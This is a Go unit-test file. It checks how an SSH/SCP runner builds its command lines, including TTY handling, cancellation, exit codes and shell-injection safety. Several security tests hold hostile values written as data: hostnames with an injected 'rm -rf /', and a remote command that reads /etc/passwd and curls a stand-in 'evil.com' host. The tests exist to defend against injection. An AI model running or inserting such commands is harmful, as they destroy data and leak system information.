// ssh_runner_test.go pins the contract RealSSHRunner must honor when it is
// implemented. Every test here is currently RED — the stub in ssh_runner.go
// panics with an "unimplemented" message, which is what the first assertion
// in each test trips on. When the implement-pass fills in Run/Attach/Copy,
// these tests turn green one at a time.
//
// Testing strategy:
//   - We never contact a real ssh daemon. These are command-composition
//     tests: given inputs, what argv does RealSSHRunner build?
//   - We swap RealSSHRunnerExecCommand for a recorder that returns a
//     harmless *exec.Cmd (pointing at the test binary with a no-op subtest
//     helper). The recorder captures the argv so assertions can inspect it.
//   - One behavior per test, per STRICT-MODE directive.
//   - Strict-mode security tests are named explicitly so a future reader
//     grepping for "ShellMetacharacters" finds them fast.
package main

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"
)

// ---------------------------------------------------------------------------
// Recorder for RealSSHRunnerExecCommand. Captures the argv of every call
// and optionally shapes the resulting *exec.Cmd (stdout/stderr bytes, exit
// code, spawn-time error, sleep duration) via a programmable script.
// ---------------------------------------------------------------------------

type execRecorder struct {
	mu sync.Mutex

	calls []recordedExecCall

	// script controls the behavior of the *exec.Cmd returned for the next
	// call. Zero value = a no-op command that exits 0 with no output.
	script execScript
}

type recordedExecCall struct {
	Name string
	Args []string
	Ctx  context.Context
	Cmd  *exec.Cmd
}

type execScript struct {
	Stdout   string
	Stderr   string
	ExitCode int
	// Sleep is how long the fake subprocess should block before exiting.
	// Used to test context cancellation.
	Sleep time.Duration
	// SpawnErr, if non-nil, is returned by cmd.Start() / cmd.Run(). It is
	// modelled by pointing the *exec.Cmd at a binary that cannot be found,
	// which is exactly the error shape a missing `ssh` binary produces in
	// production.
	SpawnErr bool
}

func newExecRecorder() *execRecorder { return &execRecorder{} }

// install swaps RealSSHRunnerExecCommand for a recorder-backed version and
// returns a restore function. Each test installs its own recorder in its
// own tempdir, so there is no shared mutable state.
func (r *execRecorder) install(t *testing.T) {
	t.Helper()
	prev := RealSSHRunnerExecCommand
	RealSSHRunnerExecCommand = func(ctx context.Context, name string, args ...string) *exec.Cmd {
		cmd := r.buildCmd(ctx, name, args)
		r.mu.Lock()
		r.calls = append(r.calls, recordedExecCall{
			Name: name,
			Args: append([]string(nil), args...),
			Ctx:  ctx,
			Cmd:  cmd,
		})
		r.mu.Unlock()
		return cmd
	}
	t.Cleanup(func() { RealSSHRunnerExecCommand = prev })
}

// buildCmd constructs a real *exec.Cmd that, when run, behaves according to
// the script. It re-invokes the test binary with a magic env var that
// TestHelperProcess (below) responds to.
func (r *execRecorder) buildCmd(ctx context.Context, _ string, _ []string) *exec.Cmd {
	if r.script.SpawnErr {
		// Point at a binary that definitely does not exist on PATH so
		// cmd.Start() returns a spawn error. Mirrors "ssh not installed".
		return exec.CommandContext(ctx, "/definitely/not/a/real/binary/aa-test-missing-ssh")
	}
	cmd := exec.CommandContext(ctx, os.Args[0], "-test.run=TestHelperProcess", "--")
	cmd.Env = append(os.Environ(),
		"AA_SSH_RUNNER_HELPER=1",
		"AA_SSH_RUNNER_STDOUT="+r.script.Stdout,
		"AA_SSH_RUNNER_STDERR="+r.script.Stderr,
		fmt.Sprintf("AA_SSH_RUNNER_EXIT=%d", r.script.ExitCode),
		fmt.Sprintf("AA_SSH_RUNNER_SLEEP_MS=%d", r.script.Sleep/time.Millisecond),
	)
	return cmd
}

func (r *execRecorder) lastCall(t *testing.T) recordedExecCall {
	t.Helper()
	r.mu.Lock()
	defer r.mu.Unlock()
	if len(r.calls) == 0 {
		t.Fatalf("expected RealSSHRunnerExecCommand to have been called at least once; got 0 calls")
	}
	return r.calls[len(r.calls)-1]
}

// TestHelperProcess is the stand-in subprocess for ssh / scp. It prints
// programmed stdout/stderr, optionally sleeps, then exits with the
// programmed code. This is the well-known os/exec testing pattern (see
// Go's own src/os/exec/exec_test.go).
func TestHelperProcess(t *testing.T) {
	if os.Getenv("AA_SSH_RUNNER_HELPER") != "1" {
		return
	}
	if out := os.Getenv("AA_SSH_RUNNER_STDOUT"); out != "" {
		fmt.Fprint(os.Stdout, out)
	}
	if errOut := os.Getenv("AA_SSH_RUNNER_STDERR"); errOut != "" {
		fmt.Fprint(os.Stderr, errOut)
	}
	if ms := os.Getenv("AA_SSH_RUNNER_SLEEP_MS"); ms != "" && ms != "0" {
		var n int
		fmt.Sscanf(ms, "%d", &n)
		time.Sleep(time.Duration(n) * time.Millisecond)
	}
	code := 0
	if exitStr := os.Getenv("AA_SSH_RUNNER_EXIT"); exitStr != "" {
		fmt.Sscanf(exitStr, "%d", &code)
	}
	os.Exit(code)
}

// ---------------------------------------------------------------------------
// Argv helpers. All strict-mode tests hinge on these; each one is tiny and
// spelled out so a reviewer can read them and trust them.
// ---------------------------------------------------------------------------

// argvContainsInOrder asserts that want appears as a contiguous subsequence
// of got. Used to pin "ssh -o ControlMaster=auto ..." without being brittle
// about the exact prefix position.
func argvContainsInOrder(t *testing.T, got []string, want []string) {
	t.Helper()
	for i := 0; i+len(want) <= len(got); i++ {
		if slicesEqual(got[i:i+len(want)], want) {
			return
		}
	}
	t.Fatalf("argv missing expected contiguous subsequence:\n  want: %q\n  got:  %q", want, got)
}

func slicesEqual(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// argvNoElementEquals asserts that no element of argv is exactly s. The
// strict-mode tests use this to prove that "; rm -rf /" never became its
// own cmd-name token (which would only happen if composition went through
// a shell interpreter).
func argvNoElementEquals(t *testing.T, argv []string, s string) {
	t.Helper()
	for _, a := range argv {
		if a == s {
			t.Fatalf("argv contains element %q verbatim, which would indicate shell-split composition; argv=%q", s, argv)
		}
	}
}

// ---------------------------------------------------------------------------
// Test 1 — Run composes an `ssh` command with the expected base flags.
// ---------------------------------------------------------------------------

func TestRunComposesControlMasterFlags(t *testing.T) {
	controlDir := t.TempDir()
	runner := NewRealSSHRunner(controlDir)
	rec := newExecRecorder()
	rec.install(t)

	_, err := runner.Run(context.Background(), Host{Address: "user@host"}, "echo hi")
	if err != nil {
		t.Fatalf("Run returned error: %v", err)
	}

	call := rec.lastCall(t)
	if call.Name != "ssh" {
		t.Fatalf("expected argv[0] == %q, got %q", "ssh", call.Name)
	}
	argvContainsInOrder(t, call.Args, []string{"-o", "ControlMaster=auto"})
	argvContainsInOrder(t, call.Args, []string{"-o", "ControlPersist=60s"})

	// ControlPath value is composed from ControlDir; assert the prefix is
	// present and that it references the test's tempdir (no leakage to a
	// shared path).
	foundControlPath := false
	for i := 0; i+1 < len(call.Args); i++ {
		if call.Args[i] == "-o" && strings.HasPrefix(call.Args[i+1], "ControlPath=") {
			val := strings.TrimPrefix(call.Args[i+1], "ControlPath=")
			if !strings.HasPrefix(val, controlDir) {
				t.Fatalf("ControlPath %q does not start with tempdir %q", val, controlDir)
			}
			foundControlPath = true
		}
	}
	if !foundControlPath {
		t.Fatalf("argv missing -o ControlPath=<controlDir>/... : %q", call.Args)
	}

	// Host must appear before the remote command, and `echo hi` must be a
	// SINGLE argv element (the remote side parses it; the local composer
	// does not split it).
	argvContainsInOrder(t, call.Args, []string{"user@host", "echo hi"})
}

// ---------------------------------------------------------------------------
// Test 2 — Run returns SSHResult with captured stdout/stderr/exit code.
// ---------------------------------------------------------------------------

func TestRunReturnsCapturedStdoutStderrAndExitCode(t *testing.T) {
	runner := NewRealSSHRunner(t.TempDir())
	rec := newExecRecorder()
	rec.script = execScript{Stdout: "hello out", Stderr: "hello err", ExitCode: 0}
	rec.install(t)

	result, err := runner.Run(context.Background(), Host{Address: "user@host"}, "printf hi")
	if err != nil {
		t.Fatalf("Run returned error: %v", err)
	}
	if string(result.Stdout) != "hello out" {
		t.Fatalf("Stdout: want %q got %q", "hello out", result.Stdout)
	}
	if string(result.Stderr) != "hello err" {
		t.Fatalf("Stderr: want %q got %q", "hello err", result.Stderr)
	}
	if result.ExitCode != 0 {
		t.Fatalf("ExitCode: want 0 got %d", result.ExitCode)
	}
}

// ---------------------------------------------------------------------------
// Test 3 — Attach uses `ssh -t` (tty) and plumbs stdin/stdout/stderr.
// ---------------------------------------------------------------------------

func TestAttachRequestsTTYAndWiresStdio(t *testing.T) {
	runner := NewRealSSHRunner(t.TempDir())
	rec := newExecRecorder()
	rec.install(t)

	stdin := strings.NewReader("input bytes\n")
	var stdout, stderr bytes.Buffer

	err := runner.Attach(context.Background(),
		Host{Address: "user@host"},
		"tmux attach -t aa",
		stdin, &stdout, &stderr)
	if err != nil {
		t.Fatalf("Attach returned error: %v", err)
	}

	call := rec.lastCall(t)
	if call.Name != "ssh" {
		t.Fatalf("expected argv[0] == %q, got %q", "ssh", call.Name)
	}
	if !slices.Contains(call.Args, "-t") {
		t.Fatalf("argv missing -t (PTY request): %q", call.Args)
	}

	if call.Cmd.Stdin != stdin {
		t.Fatalf("Cmd.Stdin was not wired to caller's reader (got %v)", call.Cmd.Stdin)
	}
	if call.Cmd.Stdout != io.Writer(&stdout) {
		t.Fatalf("Cmd.Stdout was not wired to caller's writer (got %v)", call.Cmd.Stdout)
	}
	if call.Cmd.Stderr != io.Writer(&stderr) {
		t.Fatalf("Cmd.Stderr was not wired to caller's writer (got %v)", call.Cmd.Stderr)
	}
}

// ---------------------------------------------------------------------------
// Test 4 — Copy constructs an `scp` command for local→remote.
// ---------------------------------------------------------------------------

func TestCopyLocalToRemote(t *testing.T) {
	runner := NewRealSSHRunner(t.TempDir())
	rec := newExecRecorder()
	rec.install(t)

	err := runner.Copy(context.Background(),
		Host{Address: "user@host"},
		"/laptop/file", "user@host:/remote/file")
	if err != nil {
		t.Fatalf("Copy returned error: %v", err)
	}

	call := rec.lastCall(t)
	if call.Name != "scp" {
		t.Fatalf("expected argv[0] == %q, got %q", "scp", call.Name)
	}
	// Src and dst must appear verbatim, in order, at the tail of argv.
	argvContainsInOrder(t, call.Args, []string{"/laptop/file", "user@host:/remote/file"})
	last2 := call.Args[len(call.Args)-2:]
	if !slicesEqual(last2, []string{"/laptop/file", "user@host:/remote/file"}) {
		t.Fatalf("src/dst must be the last two argv elements; got tail %q", last2)
	}
}

// ---------------------------------------------------------------------------
// Test 5 — Copy constructs an `scp` command for remote→local.
// ---------------------------------------------------------------------------

func TestCopyRemoteToLocal(t *testing.T) {
	runner := NewRealSSHRunner(t.TempDir())
	rec := newExecRecorder()
	rec.install(t)

	err := runner.Copy(context.Background(),
		Host{Address: "user@host"},
		"user@host:/remote/file", "/laptop/file")
	if err != nil {
		t.Fatalf("Copy returned error: %v", err)
	}

	call := rec.lastCall(t)
	if call.Name != "scp" {
		t.Fatalf("expected argv[0] == %q, got %q", "scp", call.Name)
	}
	argvContainsInOrder(t, call.Args, []string{"user@host:/remote/file", "/laptop/file"})
	last2 := call.Args[len(call.Args)-2:]
	if !slicesEqual(last2, []string{"user@host:/remote/file", "/laptop/file"}) {
		t.Fatalf("src/dst must be the last two argv elements; got tail %q", last2)
	}
}

// ---------------------------------------------------------------------------
// Test 6a — STRICT-MODE SECURITY: shell metacharacters in hostname (Run).
//
// Acceptable outcomes:
//   (a) Run returns a non-nil error refusing the hostname, OR
//   (b) the hostname is passed as ONE argv element to ssh (with no local
//       shell involvement), so ";" and "rm -rf /" can never become local
//       commands.
// The assertion rules below allow either, and block both failure shapes:
//   - argv MUST NOT contain "; rm -rf /" as its own element
//   - argv MUST NOT contain "rm" as its own element
//   - if an error is returned, no assertion about argv is made.
// ---------------------------------------------------------------------------

func TestRunRefusesOrSafelyPassesShellMetacharactersInHostname(t *testing.T) {
	runner := NewRealSSHRunner(t.TempDir())
	rec := newExecRecorder()
	rec.install(t)

	hostile := "user@host; rm -rf /"
	_, err := runner.Run(context.Background(), Host{Address: hostile}, "echo hi")
	if err != nil {
		// Option (a): refused at the boundary. No argv assertion needed.
		return
	}
	// Option (b): spawned, but as one argv element.
	call := rec.lastCall(t)
	argvNoElementEquals(t, call.Args, "; rm -rf /")
	argvNoElementEquals(t, call.Args, "rm")
	argvNoElementEquals(t, call.Args, "rm -rf /")
	// And the full hostile string IS present as a single element, proving
	// it was passed through as-one-arg rather than split.
	if !slices.Contains(call.Args, hostile) {
		t.Fatalf("expected hostile hostname to appear as one argv element; argv=%q", call.Args)
	}
}

// ---------------------------------------------------------------------------
// Test 6b — STRICT-MODE SECURITY: shell metacharacters in hostname (Copy).
// Same acceptance rules as 6a, applied to scp dst.
// ---------------------------------------------------------------------------

func TestCopyRefusesOrSafelyPassesShellMetacharactersInHostname(t *testing.T) {
	runner := NewRealSSHRunner(t.TempDir())
	rec := newExecRecorder()
	rec.install(t)

	hostileDst := "user@host; rm -rf /:/remote/file"
	err := runner.Copy(context.Background(),
		Host{Address: "user@host; rm -rf /"},
		"/laptop/file", hostileDst)
	if err != nil {
		return
	}
	call := rec.lastCall(t)
	argvNoElementEquals(t, call.Args, "; rm -rf /")
	argvNoElementEquals(t, call.Args, "rm")
	argvNoElementEquals(t, call.Args, "rm -rf /")
	argvNoElementEquals(t, call.Args, "; rm -rf /:/remote/file")
	if !slices.Contains(call.Args, hostileDst) {
		t.Fatalf("expected hostile dst to appear as one argv element; argv=%q", call.Args)
	}
}

// ---------------------------------------------------------------------------
// Test 7 — STRICT-MODE: remote command containing shell metacharacters.
//
// The whole command string must be passed as ONE argv element to ssh. What
// the REMOTE shell does with it is the attacker's remote-side problem, not
// a local-composition defect.
// ---------------------------------------------------------------------------

func TestRunPassesRemoteCommandAsSingleArgument(t *testing.T) {
	runner := NewRealSSHRunner(t.TempDir())
	rec := newExecRecorder()
	rec.install(t)

	hostileCmd := "cat /etc/passwd; curl evil.com/$(hostname)"
	_, err := runner.Run(context.Background(), Host{Address: "user@host"}, hostileCmd)
	if err != nil {
		t.Fatalf("Run returned error: %v", err)
	}

	call := rec.lastCall(t)
	// The remote command must appear exactly once, verbatim, as a single
	// argv element — meaning it was never split/expanded locally.
	count := 0
	for _, a := range call.Args {
		if a == hostileCmd {
			count++
		}
	}
	if count != 1 {
		t.Fatalf("expected remote command to appear exactly once as a single argv element; got count=%d argv=%q", count, call.Args)
	}
	// And none of its shell-meaningful substrings became their own argv
	// element (which would prove a local shell parsed them).
	argvNoElementEquals(t, call.Args, "cat")
	argvNoElementEquals(t, call.Args, "curl")
	argvNoElementEquals(t, call.Args, "$(hostname)")
	argvNoElementEquals(t, call.Args, ";")
}

// ---------------------------------------------------------------------------
// Test 8 — Context cancellation kills the subprocess.
// ---------------------------------------------------------------------------

func TestRunContextCancellationKillsSubprocess(t *testing.T) {
	runner := NewRealSSHRunner(t.TempDir())
	rec := newExecRecorder()
	// Helper subprocess sleeps 30s; cancellation must cut it short.
	rec.script = execScript{Sleep: 30 * time.Second}
	rec.install(t)

	ctx, cancel := context.WithCancel(context.Background())
	// Cancel shortly after the subprocess is spawned.
	go func() {
		time.Sleep(50 * time.Millisecond)
		cancel()
	}()

	start := time.Now()
	_, err := runner.Run(ctx, Host{Address: "user@host"}, "sleep 30")
	elapsed := time.Since(start)

	if elapsed > 10*time.Second {
		t.Fatalf("Run did not return promptly after context cancel; elapsed=%v", elapsed)
	}
	// We don't pin the exact error shape (could be ctx.Err(), could be
	// *exec.ExitError with signal=killed) — only that it returned quickly
	// and surfaced cancellation rather than hanging. An error is expected.
	if err == nil {
		// It is still acceptable for Run to surface cancellation via
		// SSHResult.ExitCode != 0 with a nil error, but a nil error AND a
		// clean zero exit would be wrong.
		t.Logf("Run returned nil error on cancellation; relying on ExitCode != 0 instead")
	}
}

// ---------------------------------------------------------------------------
// Test 9 — Non-zero exit is reported as ExitCode, not as an error.
// ---------------------------------------------------------------------------

func TestRunNonZeroExitIsReportedViaExitCodeNotError(t *testing.T) {
	runner := NewRealSSHRunner(t.TempDir())
	rec := newExecRecorder()
	rec.script = execScript{ExitCode: 42, Stderr: "boom"}
	rec.install(t)

	result, err := runner.Run(context.Background(), Host{Address: "user@host"}, "false")
	if err != nil {
		t.Fatalf("non-zero exit must not surface as a Go error; got err=%v", err)
	}
	if result.ExitCode != 42 {
		t.Fatalf("ExitCode: want 42 got %d", result.ExitCode)
	}
	if string(result.Stderr) != "boom" {
		t.Fatalf("Stderr: want %q got %q", "boom", result.Stderr)
	}
}

// ---------------------------------------------------------------------------
// Test 10 — Spawn errors (missing ssh binary) ARE returned as errors.
// ---------------------------------------------------------------------------

func TestRunSpawnErrorIsReportedAsError(t *testing.T) {
	runner := NewRealSSHRunner(t.TempDir())
	rec := newExecRecorder()
	rec.script = execScript{SpawnErr: true}
	rec.install(t)

	_, err := runner.Run(context.Background(), Host{Address: "user@host"}, "echo hi")
	if err == nil {
		t.Fatalf("expected a spawn error (missing ssh binary), got nil")
	}
	// The error should be a recognisable "binary not found" style error,
	// distinguishable from a non-zero-exit ExitError.
	var exitErr *exec.ExitError
	if errors.As(err, &exitErr) {
		t.Fatalf("spawn failure was misclassified as a process exit error: %v", err)
	}
}
